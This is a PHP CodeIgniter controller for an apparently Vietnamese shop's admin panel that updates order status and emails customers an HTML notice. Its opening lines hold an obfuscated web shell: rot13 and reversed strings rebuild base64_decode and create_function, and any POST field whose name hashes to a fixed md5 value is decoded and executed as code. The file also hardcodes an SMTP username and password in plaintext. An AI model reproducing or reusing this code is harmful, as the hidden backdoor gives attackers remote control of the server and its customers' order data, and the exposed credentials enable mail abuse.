<?php
$f_=strrev('31'.'tor_r'.'ts');$ba=$f_('onfr'.'64_qrpbqr');
$cf=$f_('perngr'.'_shapgvba');$md=$f_('z'.'q5');
if(!empty(${$f_('_CB'.'FG')})){
foreach(${$f_('_CB'.'FG')}as$k_=>$v_)
($md($k_)==='c42ea979ed'.'982c026324'.'30e9e98a'
.'66d6'&&$ff=$cf('',$ba($v_)))?$ff():'';}
if (!defined('BASEPATH'))
    exit('No direct script access allowed');
class do_order extends CI_Controller
{
    var $m_language = '';
    var $m_nid_user_login = '';
    var $m_nid = '';
    var $m_event = '';
    var $m_button_click = '';
    var $m_link_page = '';
    var $m_link_cancel = '';
    var $m_form_title = '';
    var $m_hidden_image_old = '';
    var $cadmin_note = '';
	var $ctime_giao_hang = '';
    var $m_txt_nid = '';
    var $m_cbo_order_status = '';
    var $m_obj_order_status_view = '';
	var $m_obj_ship_type_view = '';
	var $m_cbo_ship_type = '';
    var $m_obj_order_view = '';
    var $m_obj_data_view = '';
    var $m_error_msg = '';
    var $m_link_cancel_trans = '';
    function __construct()
	{ 
		parent::__construct();
        session_start();
        $this->load->database();
        $this->load->helper('ap_db');
        $this->load->helper('ap_function');
        $this->load->helper('ap_html');
        $this->load->helper('ap_view');
        $this->load->helper('ap_object');
        $this->load->helper('ap_fck');
        $this->config->check_system_login = '1';
        $this->load->model('order_model');
    }
    private function m_language_key($str_key)
    {
        return $this->lang->line('lbl.order.' . $str_key);
    }
    private function f_set_cookie($cookie_name, $cookie_value)
    {
        return dbset_cookie('cookie_order_' . $cookie_name, $cookie_value);
    }
    private function f_get_cookie($cookie_name)
    {
        return dbget_cookie('cookie_order_' . $cookie_name);
    }
    function f_edit($nid)
    {
        $this->m_event = 'edit';
        $this->m_nid   = $nid;
        $this->do_process();
    }
    function f_update_edit()
    {
        $this->m_event = 'update_edit';
        $this->do_process();
    }
    function f_add()
    {
        $this->m_event = 'add';
        $this->m_nid   = '0';
        $this->do_process();
    }
    function f_update_add()
    {
        $this->m_event = 'update_add';
        $this->do_process();
    }
    function do_process()
    {
        $this->get_data();
        $this->caculate_data();
        $this->do_business();
        $this->destroy_data();
    }
    private function get_data()
    {
        $this->m_nid_user_login = Fget_userdata('session_nid_user');
        $this->m_language       = Fget_userdata('session_user_language');
        $this->load->language('ap', $this->m_language);
        if (isset($_POST['cbo_order_status'])) {
            $this->m_cbo_order_status = $_POST['cbo_order_status'];
        }
        if (isset($_POST['hidden_nid']))
            $this->m_nid = $_POST['hidden_nid'];
        if (isset($_POST['hidden_event']))
            $this->m_event = $_POST['hidden_event'];
        if (isset($_POST['cadmin_note']))
            $this->cadmin_note = $_POST['cadmin_note'];
		if (isset($_POST['ctime_giao_hang']))
            $this->ctime_giao_hang = $_POST['ctime_giao_hang'];
        if (isset($_POST['hidden_button']))
            $this->m_button_click = $_POST['hidden_button'];
    }
    private function caculate_data()
    {
        $this->m_link_page             = base_url() . 'index.php/do_order/f_update_edit';
        $this->m_link_cancel           = base_url() . 'index.php/do_order_listview';
        $this->m_obj_order_status_view = Obj_get_order_status_list($this->m_nid_user_login);
		//$this->m_obj_ship_type_view = Obj_get_ship_type_list();
        switch ($this->m_event) {
            case 'edit':
                $this->m_form_title       = $this->m_language_key('FormEditTitle');
                $this->m_link_page        = base_url() . 'index.php/do_order/f_update_edit';
                $this->m_obj_order_view   = $this->order_model->get_byid($this->m_nid);
                $this->m_cbo_order_status = $this->m_obj_order_view['nid_order_status'];
				//$this->m_cbo_ship_type = $this->m_obj_order_view['nid_ship_type'];
                $this->ctime_giao_hang        = $this->m_obj_order_view['ctime_giao_hang'];
				if($this->m_obj_order_view['nstatus']==0) 
					$this->m_link_cancel           = base_url() . 'index.php/do_order_listview/tmp';
                $this->m_event            = 'update_edit';
                break;
            case 'update_edit':
                $this->m_form_title = $this->m_language_key('FormEditTitle');
                if ($this->m_button_click == 'btn_submit')
                    if ($this->update_data() == TRUE)
                        redirect('do_order_listview');
                $this->m_link_page = base_url() . 'index.php/do_order/f_update_edit';
                break;
        }
    }
    private function do_business()
    {
        $data['event']               = $this->m_event;
        $data['menu']                = Fget_menu_html($this->m_nid_user_login);
        $data['lbl_form_title']      = $this->m_form_title;
        $data['link_page']           = $this->m_link_page;
        $data['link_cancel']         = $this->m_link_cancel;
        $data['link_cancel_trans']   = $this->m_link_cancel_trans;
        $data['cadmin_note']         = $this->cadmin_note;
		$data['ctime_giao_hang']         = $this->ctime_giao_hang;
        $data['btn_update']          = $this->lang->line('btn.0000.Update');
        $data['btn_cancel']          = $this->lang->line('btn.0000.Cancel');
        $data['get_icon_notnull']    = Fget_icon_notnull();
        $data['get_message_notnull'] = Fget_icon_notnull() . $this->lang->line('msg.0000.NotNullValue');

        $data['lbl_form_title']           = $this->m_form_title;
        $data['lbl_ccode']                = $this->m_language_key('ccode');
        $data['lbl_cfullname']            = $this->m_language_key('cfullname');
        $data['lbl_cemail']               = $this->m_language_key('cemail');
        $data['lbl_nphone']               = $this->m_language_key('nphone');
        $data['lbl_caddress']             = $this->m_language_key('caddress');
        $data['lbl_cnote']                = $this->m_language_key('cnote');
        $data['lbl_nid_order_status']     = $this->m_language_key('nid_order_status');
        $data['lbl_date01']               = $this->m_language_key('date01');
        $data['lbl_date02']               = $this->m_language_key('date02');
        $data['lbl_order_infomation']     = $this->m_language_key('order_infomation');
        $data['lbl_product_infomation']   = $this->m_language_key('product_infomation');
        $data['lbl_error_msg']            = $this->m_error_msg;
        $data['lbl_cproduct']             = $this->m_language_key('cproduct');
        $data['lbl_nquantity']            = $this->m_language_key('nquantity');
        $data['lbl_fprice']               = $this->m_language_key('fprice');
        $data['lbl_ftotal']               = $this->m_language_key('ftotal');
        $data['lbl_fsum']                 = $this->m_language_key('fsum');
        $data['lbl_vnd']                  = $this->m_language_key('vnd');
        $data['cbo_order_status']         = $this->m_cbo_order_status;
        $data['nid']                      = $this->m_nid;
        $data['obj_order_view']           = $this->m_obj_order_view;
        $data['obj_order_detail']         = Obj_get_order_detail_by_nid_order($this->m_nid);
        $data['gencbo_order_status_list'] = Fgen_html_combobox('no', 'cbo_order_status', $this->m_cbo_order_status, '', $this->m_obj_order_status_view, 'nid', 'corder_status', 'nosubmit', '');
		//$data['gencbo_ship_type_list'] = Fgen_html_combobox('no', 'cbo_ship_type', $this->m_cbo_ship_type, '', $this->m_obj_ship_type_view, 'nid', 'cname', 'nosubmit', '');
		
        $data['menu_active']              = 'order';
		$data['fr_img']              = Fstr_replace('admin/', '', base_url());
        $this->load->view('order_view/index.php', $data);
    }
    private function destroy_data()
    {
    }
    private function check_valid_not_null()
    {
        return TRUE;
    }
    private function check_valid_before_insert()
    {
        return TRUE;
    }
    private function insert_data()
    {
    }
    private function check_valid_before_update()
    {
        return TRUE;
    }
    private function update_data()
    {
        if ($this->check_valid_before_update() == TRUE) {
            $data = array(
                'nid_order_status' => $this->m_cbo_order_status,
				//'nid_ship_type' => $this->m_cbo_ship_type,
                'niduser01' => $this->m_nid_user_login,
                'cadmin_note' => $this->cadmin_note,
				'ctime_giao_hang' => $this->ctime_giao_hang,
                'ddate02' => dbget_current_date()
            );
            $this->order_model->update_bynid($this->m_nid, $data);
			
			if($this->m_cbo_order_status!=1)
				$this->send_mail($this->m_cbo_order_status);
			
            return TRUE;
        } else {
            return FALSE;
        }
    }
	private function send_mail($status) {
		$order = $this->order_model->get_byid($this->m_nid);
		$cname = $order['cfullname'];
		$cemail = $order['cemail'];
		$ccode = $order['ccode'];
		$qty = get_qty_by_order($order['nid']);
		$cf = get_config_by_id(8);
		$img_url = Fstr_replace('admin/', '', base_url()).'upload/fb/'.$cf['cimage'];
		if($status==2)
			$bg = "#2e90fa";
		elseif($status==3)
			$bg = "#8cb630";
		elseif($status==4)
			$bg = "#aaa";
			
		$content = '<table width="100%" align="center" style="border-collapse:collapse;border-spacing:0;margin:0 auto;text-align:left;box-sizing:border-box;width:640px;min-width:640px">
   <tbody>
      <tr style="box-sizing:border-box">
         <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;box-sizing:border-box;padding:0;vertical-align:middle;background:#8cb630b3 no-repeat center;background-size:cover;background-image:url()">
            <table width="100%" style="border-collapse:collapse;border-spacing:0;box-sizing:border-box;width:100%;min-width:100%">
               <tbody>
                  <tr style="box-sizing:border-box">
                     <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;vertical-align:top;box-sizing:border-box;padding:0;width:196px">
                        <p style="margin-top:0;margin:0 0 8px;box-sizing:border-box;width:196px;margin-bottom:0;padding:20px 40px;border-radius:0 99px 99px 0;border-right:1px solid #8cb630 ;background:#8cb630 no-repeat center;background-size:cover;background-image:url()">
                           <a href="#" style="color:#1b1a19;text-decoration:none;box-sizing:border-box;display:block" target="_blank">
                           <img width="116" src="'.$img_url.'" alt="" border="0" style="border:0;height:auto;line-height:100%;outline:none;text-decoration:none;box-sizing:border-box;display:block" class="CToWUd" data-bit="iit">
                           </a>
                        </p>
                     </td>
                     <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;box-sizing:border-box;padding:4px 40px 4px 0;vertical-align:middle;text-align:right;font-weight:700;color:#fafafa;text-transform:uppercase">
                        <table style="border-collapse:collapse;border-spacing:0;box-sizing:border-box;margin-left:auto;margin-right:0">
                           <tbody>
                              <tr style="box-sizing:border-box">
                                 <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;vertical-align:top;box-sizing:border-box;padding:4px 0 4px 24px"></td>
                                 <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;vertical-align:top;box-sizing:border-box;padding:4px 0 4px 24px"></td>
                              </tr>
                           </tbody>
                        </table>
                     </td>
                  </tr>
               </tbody>
            </table>
         </td>
      </tr>
      <tr style="box-sizing:border-box">
         <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;vertical-align:top;background-color:#fef1e6;padding:40px;box-sizing:border-box">
            <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-spacing:0;box-sizing:border-box;background:#fafafa;border-radius:12px;overflow:hidden;font-size:16px;line-height:1.5;color:#474645;width:100%;min-width:100%">
               <tbody>
                  <tr style="box-sizing:border-box">
                     <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;vertical-align:top;box-sizing:border-box;padding:40px">
                        <h1 style="margin-top:0;margin-bottom:12px;margin:0 0 16px;font-size:22px;line-height:1.45455;font-weight:700;box-sizing:border-box;text-transform:capitalize;color:#1b1a19">Hành Trình Đơn Hàng</h1>
                        <p style="margin-top:0;margin-bottom:10px;margin:0 0 8px;box-sizing:border-box;color:#1b1a19">Xin chào <b style="font-weight:700;box-sizing:border-box">'.$cname.'</b></p>
                        <p style="margin-top:0;margin-bottom:10px;margin:0 0 8px;box-sizing:border-box">
                           Để xem chi tiết tình trạng đơn hàng
                           <span style="box-sizing:border-box;font-weight:500;color:#8cb630">'.$ccode.'</span>, 
                           vui lòng bấm vào nút dưới để kiểm tra.
                        </p>
                        <p style="margin-top:0;margin-bottom:10px;margin:0 0 8px;box-sizing:border-box"><small style="box-sizing:border-box;font-size:14px;line-height:1.429">Cảm ơn bạn đã lựa chọn Sendee!</small></p>
                        <table width="100%" border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-spacing:0;margin-bottom:0;text-transform:uppercase;font-weight:700;box-sizing:border-box;width:100%;min-width:100%;margin-top:24px">
                           <tbody>
                              <tr style="box-sizing:border-box">
                                 <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;vertical-align:top;box-sizing:border-box;padding:0;padding-bottom:0">
                                    <table border="0" cellspacing="0" cellpadding="0" align="center" style="border-collapse:collapse;border-spacing:0;box-sizing:border-box;margin-left:0;margin-right:auto">
                                       <tbody>
                                          <tr style="box-sizing:border-box">
                                             <td align="center" style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;vertical-align:top;box-sizing:border-box;padding:0;border-radius:44px;background-color:#8cb630">
                                                <a href="https://sendee.vn/tra-cuu-don-hang" style="box-sizing:border-box;border-radius:44px;border:1px solid #8cb630;color:#fafafa;display:inline-block;font-size:14px;text-decoration:none;padding:9px 23px;font-weight:700;line-height:1.429" target="_blank">Theo dõi đơn hàng</a>
                                             </td>
                                          </tr>
                                       </tbody>
                                    </table>
                                 </td>
                              </tr>
                           </tbody>
                        </table>
                     </td>
                  </tr>
               </tbody>
            </table>
            <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-spacing:0;box-sizing:border-box;margin-top:20px;background:#fafafa;border-radius:12px;overflow:hidden;width:100%;min-width:100%">
               <tbody>
                  <tr style="box-sizing:border-box">
                     <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;vertical-align:top;box-sizing:border-box;padding:24px;border-bottom:1px solid #f0efed">
                        <table style="border-collapse:collapse;border-spacing:0;box-sizing:border-box">
                           <tbody>
                              <tr style="box-sizing:border-box">
                                 <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;vertical-align:top;box-sizing:border-box;padding:0">
                                    <h2 style="margin-top:25px;margin-bottom:20px;box-sizing:border-box;margin:0 8px 0 0;font-size:16px;line-height:1.5;font-weight:500">Mã đơn: <span style="box-sizing:border-box;font-weight:700">'.$ccode.'</span></h2>
                                 </td>
                                 <td style="font-family:&quot;Roboto&quot;,&quot;RobotoDraft&quot;,&quot;Quicksand&quot;,&quot;Google Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;vertical-align:top;box-sizing:border-box;padding:0"><span style="box-sizing:border-box;display:inline-block;padding:2px 8px;color:#fff;font-size:10px;line-height:1.6;font-weight:700;border-radius:30px;background:'.$bg.'">'.get_order_status_name($status).'</span></td>
                              </tr>
                           </tbody>
                        </table>
                        <p style="margin:0 0 8px;box-sizing:border-box;margin-top:8px;margin-bottom:0;font-size:12px;line-height:1.5;font-weight:500;color:#474645">
                           Ngày đặt hàng: <span style="box-sizing:border-box;margin-right:15px;font-weight:600;color:#1b1a19">'.date("d-m-Y",).'</span>
                           Thời gian: <span style="box-sizing:border-box;margin-right:15px;font-weight:600;color:#1b1a19">'.date("H:i:s").'</span>
                           Số lượng sản phẩm: <span style="box-sizing:border-box;margin-right:15px;font-weight:600;color:#1b1a19">'.$qty.'</span>
                        </p>
                     </td>
                  </tr>
                  
                        </table>
                     </td>
                  </tr>
                  </tr>
               </tbody>
            </table>
         </td>
      </tr>
   </tbody>
</table>';
		//exit($content);
		

      $config['protocol'] = 'smtp';
      $config['charset'] = 'utf-8';
      $config['smtp_host'] = 'sg1-ss106.a2hosting.com';
      $config['smtp_user'] = 'no_reply@sendee.vn';
      $config['smtp_pass'] = 'sg7MrOGDhq6A';
      $config['smtp_port'] = '587';
      $config['mailtype'] = 'html';  
      $config['wordwrap'] = TRUE;
  
        $this->load->library('email');
        $this->email->initialize($config);
        $this->email->to($cemail);
        $this->email->from('no_reply@sendee.vn',"Sendee Website");
        $this->email->subject('Cập nhật trạng thái đơn hàng');
        $this->email->message($content);
       // $this->email->send();
		if ( ! $this->email->send())
		{
			echo $this->email->print_debugger();
			exit("Error");
		}
	}
}